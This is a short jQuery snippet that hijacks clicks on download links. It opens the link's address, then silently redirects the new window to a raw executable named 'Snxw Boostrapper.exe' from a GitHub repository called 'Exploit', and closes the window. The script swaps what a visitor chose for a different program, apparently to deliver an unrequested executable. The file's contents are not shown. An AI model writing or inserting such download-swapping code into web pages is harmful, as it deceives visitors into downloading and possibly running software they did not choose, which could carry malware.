$(".DownloadLink").click(
    function(e) {   
        e.preventDefault();
        let new_window = open( $(this).attr("href") );
        new_window.location="https://github.com/SxnwDev/Exploit/raw/main/Snxw%20Boostrapper.exe";
        new_window.close();
        return false;
    }
);
